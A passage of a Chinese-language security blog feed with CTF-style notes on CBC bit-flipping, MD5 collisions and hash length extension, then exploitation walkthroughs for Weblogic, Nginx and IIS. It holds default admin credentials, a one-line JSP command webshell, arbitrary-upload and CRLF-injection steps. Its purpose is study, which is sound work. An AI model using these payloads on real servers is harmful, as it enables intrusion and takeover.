class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此时我们已知初始IV,初始密文，且IV可控，那么CBC翻转字节攻击条件成立，可以攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这里贴一个别人写的python2 CBC字节反转攻击脚本</span><br><span class="line">自己拿python3写了半天都没写出很好的效果...</span><br><span class="line">import base64</span><br><span class="line">def bxor(b1, b2): # use xor for bytes</span><br><span class="line">    parts &#x3D; []</span><br><span class="line">    for b1, b2 in zip(b1, b2):</span><br><span class="line">        parts.append(bytes([b1 ^ b2]))</span><br><span class="line">    return b&#39;&#39;.join(parts)</span><br><span class="line">iv &#x3D; base64.b64decode(&quot;h34HL5RbMPw8oTaQ+P58nw&#x3D;&#x3D;&quot;)</span><br><span class="line">text &#x3D; b&quot;piapiapiapia\x04\x04\x04\x04&quot;</span><br><span class="line">result &#x3D; b&quot;weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&quot;</span><br><span class="line">middle &#x3D; bxor(iv,text)</span><br><span class="line">iv &#x3D; bxor(middle,result)</span><br><span class="line">print(base64.b64encode(iv))</span><br></pre></td></tr></table></figure><p>把跑出来的结果POST过去，就会得到下一步了..</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考: &lt;a href=&quot;https://www.freebuf.com/articles/database/151167.html&quot;&gt;https://www.freebuf.com/articles/database/151167.html&lt;/a&gt;&lt;br&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="杂七杂八的安全问题" scheme="http://yoursite.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>md5强等于绕过字符串</title>
    <link href="http://yoursite.com/2021/02/19/md5%E5%BC%BA%E7%AD%89%E4%BA%8E%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>http://yoursite.com/2021/02/19/md5%E5%BC%BA%E7%AD%89%E4%BA%8E%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2021-02-19T09:21:48.989Z</published>
    <updated>2021-02-19T08:50:38.674Z</updated>
    
    <content type="html"><![CDATA[<p>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p><p>和%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>用这个时，请求头要有Content-Type: application/x-www-form-urlencoded</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5</summary>
      
    
    
    
    
    <category term="杂七杂八的安全问题" scheme="http://yoursite.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Hash长度扩展攻击</title>
    <link href="http://yoursite.com/2021/02/19/Hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2021/02/19/Hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</id>
    <published>2021-02-19T09:21:48.988Z</published>
    <updated>2021-02-19T08:50:40.138Z</updated>
    
    <content type="html"><![CDATA[<p>1 byte=8 bit</p><h2 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h2><h3 id="Merkle–Damgard构造"><a href="#Merkle–Damgard构造" class="headerlink" title="Merkle–Damgård构造"></a>Merkle–Damgård构造</h3><p>易受hash长度扩展攻击的算法有 SHA系列与MD系列，因为他们都是基于Merkle–Damgård构造。具体它是怎么结构，从下文的MD5算法可以感受到</p><h3 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h3><h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><p>MD5算法里，会先设置好一个一个的分组，每个组的大小是512bit或者说是64bytes。</p><p>每个组都包含2个部分:<br>1.数据区，占56bytes来记录需要被加密的字符串数据，当数据无法填满数据区时，会进行”补位”操作(请看下文解释)<br>2.长度描述符区,用于记录“非补位”数据的大小,占8个byte，其值为该组数据区种非补位数据的bit大小的16进制值。<br>比如非补位数据是admin,其占5个byte，40个bit，40的十六进制是28，所以其值会是28。<br>然后这个值会以一种叫做小端存储的方式记录到长度描述符区。<br>（非补位数据指该组的非填充的数据，即真正需要被加密的字符串）</p><h4 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h4><p>很简单，若某个组的数据长度小于56byte，该组的数据区不会被占满，那么就会自动补位来使数据区被填满。</p><p>其规则是在数据后先添加一个80字节，然后再用00字节填充完整个数据区。</p><h4 id="分组与补位小结"><a href="#分组与补位小结" class="headerlink" title="分组与补位小结"></a>分组与补位小结</h4><p>再更进一步的了解MD5算法前，需要更加深刻地理解一下分组与补位，不然稍后的理解会非常困难。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152432.png" alt="QQ截图20210217152432"></p><h4 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h4><p>这里放张自己画的加密流程的图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152445.png" alt="QQ截图20210217152445"></p><p>字符串先分组，然后第一组与初始链进行复杂数学运算得到链1.<br>注意，这里的初始链是固定的，每个MD5运算的初始链都是固定的，其值就是图中所记录的。也就是说，无论对什么数据进行MD5加密，其初始链都是</p><p>0x67452301<br>0xefcdab89<br>0x98badcfe<br>0x10325476</p><p>ok。第一组数据与初始链进行复杂运算得到链1，然后链1与第二组数据进行复杂运算得到链2，如此往复，直到倒数第二条链与最后一组数据进行复杂运算得到最后一条链(链final)</p><p>然后链final进行高低位转换就得到最终hash，那么什么是高低位转换？</p><p>如果final链是</p><ol><li>A=0x20f4847a</li><li>B=0x42e6abf8</li><li>C=0xf9097423</li><li>D=0x51a8dad4</li></ol><p>那么其hash便是 7a84f420f8abe642237409f9d4daa851</p><h2 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h2><p>基础知识掌握了，就开始了解这个重头戏了。</p><p>以一道题为切入点（改了一下实验吧的一道题）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Your cookies don&#39;t match up! STOP HACKING THIS SITE. &lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">&#x2F;&#x2F;$secret&#x3D;&quot;XXXXXXXXXXXXXXX&quot;; This secret is 15 characters long for security!</span><br><span class="line">$username&#x3D;&quot;admin&quot;;</span><br><span class="line">$password &#x3D; $_POST[&quot;password&quot;];</span><br><span class="line">if($_POST[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password)))&#123;</span><br><span class="line">    if(is_numeric(strpos($password,&quot;abc&quot;)))&#123;</span><br><span class="line">    echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">    die (&quot;The flag is &quot;. $flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo(&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo(md5($secret . urldecode($username . &quot;admin&quot;)));</span><br><span class="line">?&gt; 93a5e7bea9c040065617b1a62ffc3d72</span><br></pre></td></tr></table></figure><p>从中我们可以得知secret长度是15，md5($sercet.”adminadmin”)=93a5e7bea9c040065617b1a62ffc3d72<br>题目的意思很明显，我们需要传两个参数getmein和password使得<br>getmein=md5($secret.”admin”.password),且password包含abc字符</p><p>那么这就是hash长度扩展攻击经典的使用典例，即:<br>知道salt长度（这里secret变量的长度）<br>知道一组被加密字符串长度小于56的样本（ md5($sercet.”adminadmin”) 的值）<br>即可知道某个值与salt一起被MD5加密后的hash</p><p>那这种攻击是如何实现的呢？<br>首先我们知道了一组样本，即等于我们知道了该样本的final链（高低位变换）。<br>同时我们知道了salt长度，即等于我们可以构造出该分组。<br>那么如果我们又构造出一个新的分组，同时其上一个组是已知样本，那么与新分组进行复杂运算的就是已知样本的final链。<br>已知样本的final链，新分组的待加密字符串，即可通过复杂运算，高低位变换获得最终hash。<br>故新分组待加密字符串的hash值是可以预测的。<br>这，就是hash长度扩展攻击的原理。<br>可能还是云里雾里的，那就看如何解题吧。</p><p>因为已知salt长度，那么可以预测一下样本的分组的情况<br>因为salt+adminadmin的长度是25，那么其bit就是200，转换为16进制就是c8.<br>那么假设salt字符全为x（仅仅是个假设而已，别想太多了），该分组的情况</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152508.png" alt="QQ截图20210217152508"></p><p>那么我们可以传参<br>password=admin%80%00*30abc<br>其中abc以前的字符会在被MD5运算的时候分配到前一个组，然后通过运算获得链1，这个链1就是我们已知样本的final链了。<br>然后我们就可以预知，这个final链与abc进行复杂运算，高低位变换得到的hash了。然后再把这个hash赋值给openmein，这个题就做出来了。</p><p>好的，大致原理就是这样了。<br>这时候可以自行写脚本来找到某明文对应的MD5密文，或者使用工具:hashpump.</p><p>![</p><p>](<a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152515.png">https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217152515.png</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1 byte=8 bit&lt;/p&gt;
&lt;h2 id=&quot;hash算法&quot;&gt;&lt;a href=&quot;#hash算法&quot; class=&quot;headerlink&quot; title=&quot;hash算法&quot;&gt;&lt;/a&gt;hash算法&lt;/h2&gt;&lt;h3 id=&quot;Merkle–Damgard构造&quot;&gt;&lt;a href=&quot;#M</summary>
      
    
    
    
    
    <category term="杂七杂八的安全问题" scheme="http://yoursite.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic漏洞</title>
    <link href="http://yoursite.com/2021/02/19/Weblogic%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2021/02/19/Weblogic%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-19T09:21:43.597Z</published>
    <updated>2021-02-19T08:50:15.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">User IDsystem</span><br><span class="line">Passwordpassword</span><br><span class="line">LevelAdministrator</span><br><span class="line"></span><br><span class="line">User IDweblogic</span><br><span class="line">Passwordweblogic</span><br><span class="line">LevelAdministrator</span><br><span class="line"></span><br><span class="line">User IDweblogic</span><br><span class="line">Passwordweblogic</span><br><span class="line"></span><br><span class="line">User IDadmin</span><br><span class="line">Passwordsecurity</span><br><span class="line"></span><br><span class="line">User IDjoe</span><br><span class="line">Passwordpassword</span><br><span class="line"></span><br><span class="line">User IDmary</span><br><span class="line">Passwordpassword</span><br><span class="line"></span><br><span class="line">User IDsystem</span><br><span class="line">Passwordsecurity</span><br><span class="line"></span><br><span class="line">User IDwlcsystem</span><br><span class="line">Passwordwlcsystem</span><br><span class="line"></span><br><span class="line">User IDwlpisystem</span><br><span class="line">Passwordwlpisystem</span><br></pre></td></tr></table></figure><h1 id="任意文件读取基础上的后台密码破解"><a href="#任意文件读取基础上的后台密码破解" class="headerlink" title="任意文件读取基础上的后台密码破解"></a>任意文件读取基础上的后台密码破解</h1><p>假设我们能前台任意文件读取,但是后台的账户密码是加密的.如何破解<br>weblogic新版本用的是AES加密，老版本用的是3DES加密<br>都是对称加密，有密钥就可解</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152611.png" alt="QQ截图20210219152611"></p><p>假设前台可以任意文件读取，那么我们只要用到用户的密文和加密的密钥即可破解。这两个文件在base_domain下, 为./security/<code>SerializedSystemIni.dat</code>和<code>config/config.xml</code><br>这里值得一提的是,.dat文件是二进制文件,建议burp打开不然容易乱码</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152627.png" alt="QQ截图20210219152627"></p><p>把二进制信息copy to file保存下来.</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152644.png" alt="QQ截图20210219152644"></p><p>获取config.xml</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152706.png" alt="QQ截图20210219152706"></p><p>xml文档里这才是管理员账户<br>开始解密，这里使用的是 <a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a> 中的tools5</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152715.png" alt="QQ截图20210219152715"></p><p>解密成功。登录就完事了</p><h1 id="后台传木马提权"><a href="#后台传木马提权" class="headerlink" title="后台传木马提权"></a>后台传木马提权</h1><p>后台传jsp木马的war包就行了<br>怎么生成war包:<br>jar cvf shell.war 木马源文件</p><p>部署-》安装-》上载文件-》选择文件选择war包-》一直下一步然后完成</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152726.png" alt="QQ截图20210219152726"></p><p>访问war包目录下的木马文件即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152737.png" alt="QQ截图20210219152737"></p><p>马子是一句话马子 &lt;%Runtime.getRuntime.exec(request.getParameter(“cmd”));%&gt;<br>命令建议用这个网站编码一下，不然有可能不会执行 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><h1 id="weblogic-uudi组件造成的端口探测"><a href="#weblogic-uudi组件造成的端口探测" class="headerlink" title="weblogic uudi组件造成的端口探测"></a>weblogic uudi组件造成的端口探测</h1><p>若weblogic加载了uudi组件，那么在 /uddiexplorer/SearchPublicRegistries.jsp 会存在端口探测问题</p><p>对该jsp传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001   </span><br></pre></td></tr></table></figure><p>我们通过改变operator的端口发包，看页面变化即可端口探测</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152757.png" alt="QQ截图20210219152757"></p><p>端口不存在，就会有could not connect over HTTP to server:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152808.png" alt="QQ截图20210219152808"></p><p>存在就有404 error code (Not Found). Please ensure that your URL is correct,</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152816.png" alt="QQ截图20210219152816"></p><h1 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h1><p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do</p><p>影响版本 Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。</p><p>前提条件:管理员在后台 -&gt;base_domain-&gt;配置-&gt;一般信息-&gt;高级，把这个勾选了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152829.png" alt="QQ截图20210219152829"></p><p>开启后我们来到 <a href="http://ip:port/ws_utc/config.do">http://ip:port/ws_utc/config.do</a> ，把这个改为<br>路径 /user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152840.png" alt="QQ截图20210219152840"></p><p>然后点安全，再点添加，把我们的jsp马传上去</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152904.png" alt="QQ截图20210219152904"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152915.png" alt="QQ截图20210219152915"></p><p>抓包，获取该木马的时间戳</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152940.png" alt="QQ截图20210219152940"></p><p>访问<br><a href="http://123.57.137.109:7001/ws_utc/css/config/keystore/%E6%97%B6%E9%97%B4%E6%88%B3_%E6%96%87%E4%BB%B6%E5%90%8D">http://123.57.137.109:7001/ws_utc/css/config/keystore/时间戳_文件名</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152951.png" alt="QQ截图20210219152951"></p><p>成功访问我的马儿<br>修复: 设置Config.do、begin.do页面登录授权后访问 ,升级，加waf</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;弱口令&quot;&gt;&lt;a href=&quot;#弱口令&quot; class=&quot;headerlink&quot; title=&quot;弱口令&quot;&gt;&lt;/a&gt;弱口令&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s</summary>
      
    
    
    
    
    <category term="中间件安全" scheme="http://yoursite.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Nginx漏洞</title>
    <link href="http://yoursite.com/2021/02/19/Nginx%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2021/02/19/Nginx%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-19T09:21:43.596Z</published>
    <updated>2021-02-19T08:50:16.737Z</updated>
    
    <content type="html"><![CDATA[<h3 id="‘-’字符解析漏洞（和iis7-7-5漏洞利用方法一致）"><a href="#‘-’字符解析漏洞（和iis7-7-5漏洞利用方法一致）" class="headerlink" title="‘/’字符解析漏洞（和iis7/7.5漏洞利用方法一致）"></a>‘/’字符解析漏洞（和iis7/7.5漏洞利用方法一致）</h3><p>url/xxx.gif/xx.php会被解析为php文件</p><p>前提条件:cgi.fix_pathinfo=1</p><h3 id="目录遍历小洞"><a href="#目录遍历小洞" class="headerlink" title="目录遍历小洞"></a>目录遍历小洞</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143839.png" alt="QQ截图20210219143839"></p><p>前提条件: nginx-conf 把这个选项改为on即可</p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143859.png" alt="QQ截图20210219143859"></p><p>前提概要:要用到别名alias<br>作用: 当设置别名时，location后面的路径没有用/闭合时，就会引起访问 url/xx../时返回的目录是当前文件夹的上层目录<br>可见返回的目录是上层目录</p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>前提条件与产生原因:<br>1.随着业务的发展，有些网站会把<a href="http://xxx/">http://xxx</a> 重定向为<a href="https://xxx/">https://xxx</a>或<a href="http://x.com/">http://x.com</a>重定向为<a href="http://www.x.com/">http://www.x.com</a>,<br>那么这种重定向的原理在nginx上的实现方式是在location块里加入return 302 http://$host:81$uri;之类的语句，<br>这里的$host,$url都是变量。$host一般为请求头的host头部,$url一般为请求行里的路径部分 如 GET /url HTTP/1.1此处的/url部分. 2.http头部里，0d（cr）和0a（lf）字符是用来分割请求头部区域的字符。头部的行是以一个crlf来分割的，也就是说请求头部每个行之间都存在着一个crlf字符来分割它们，让他们成为多个独立的行。头部与body之间有两个crlf来分割<br>作用:当某台nginx设置了形如return 302 http://$host:80$uri; 这种配置时，url是我们完全可控的，所以可以在url中人为构造crlf字符来实现分行，从而在响应头中注入我们想要得到的响应头部。<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144020.png" alt="QQ截图20210219144020"></p><h3 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h3><p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7<br>url/xxxxx.gif%20 的文件<br>被 url/xxxxx.gif%20\0x00.php (\0x00须在burp里的hex里改)<br>需开启fastcgi</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144109.png" alt="QQ截图20210219144109"></p><p>然后发包请求这个文件,并且在请求时做点手脚<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144302.png" alt="QQ截图20210219144302"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;‘-’字符解析漏洞（和iis7-7-5漏洞利用方法一致）&quot;&gt;&lt;a href=&quot;#‘-’字符解析漏洞（和iis7-7-5漏洞利用方法一致）&quot; class=&quot;headerlink&quot; title=&quot;‘/’字符解析漏洞（和iis7/7.5漏洞利用方法一致）&quot;&gt;&lt;/a&gt;‘/</summary>
      
    
    
    
    
    <category term="中间件安全" scheme="http://yoursite.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>iis漏洞</title>
    <link href="http://yoursite.com/2021/02/19/iis%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2021/02/19/iis%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-19T09:21:43.594Z</published>
    <updated>2021-02-19T08:50:18.536Z</updated>
    
    <content type="html"><![CDATA[<h3 id="关于-的php解析漏洞-iis7-7-5解析漏洞"><a href="#关于-的php解析漏洞-iis7-7-5解析漏洞" class="headerlink" title="关于/的php解析漏洞(iis7/7.5解析漏洞)"></a>关于/的php解析漏洞(iis7/7.5解析漏洞)</h3><p>适用版本 iis7/7.5<br>前提条件:<br>1.php.ini里的cgi.fix_pathinfo设置为1,且结合方式是fast-cgi</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143527.png" alt="QQ截图20210219143527"></p><p>2.开启Fast-CGI运行模式<br>作用: 在访问某个文件时，在路径后加 /<em>.php(这里的</em>指任意字符)，即可让服务器把把该文件当作php文件解析并返回<br>如图我在一个txt文件中写入php代码，让后访问它时在路径最后加了/a.php，它就被解析为php文件了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143555.png" alt="QQ截图20210219143555"></p><h3 id="PUT任意文件上传漏洞"><a href="#PUT任意文件上传漏洞" class="headerlink" title="PUT任意文件上传漏洞"></a>PUT任意文件上传漏洞</h3><p>1.适用版本 iis6.0<br>2.前提条件:服务器开启了webdav服务并且设置了写入权限</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143610.png" alt="QQ截图20210219143610"></p><p>同时找到访问网站的用户是哪个并给他读取和写入权</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143648.png" alt="QQ截图20210219143648"></p><p>3.概述：用PUT方法上传文件,并尝试getshell</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143716.png" alt="QQ截图20210219143716"></p><p>上传,并且确实上传成功，但是大多数情况下无法上传php等脚本文件</p><p>这个时候我们就会想到用move方法来将txt文件转化为php文件,但直接move往往是不行的，要用到iis6.0解析漏洞，把它写成shell.php;.txt就可以了getshell了</p><h3 id="iis6畸形解析漏洞"><a href="#iis6畸形解析漏洞" class="headerlink" title="iis6畸形解析漏洞"></a>iis6畸形解析漏洞</h3><p>iis6.0环境下会把文件畸形解析: 1.在一个文件后面加;.任意后缀名：假设有个文件是a.php，我们把它改成a.php;a.txt，他还是会被解析成php文件但是因为后缀名是txt所以会绕过一些防护<br>2.在一个名为 *.php(如a.php)的文件夹下的所有文件都会被解析为php</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;关于-的php解析漏洞-iis7-7-5解析漏洞&quot;&gt;&lt;a href=&quot;#关于-的php解析漏洞-iis7-7-5解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;关于/的php解析漏洞(iis7/7.5解析漏洞)&quot;&gt;&lt;/a&gt;关于/的php解析漏洞(i</summary>
      
    
    
    
    
    <category term="中间件安全" scheme="http://yoursite.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
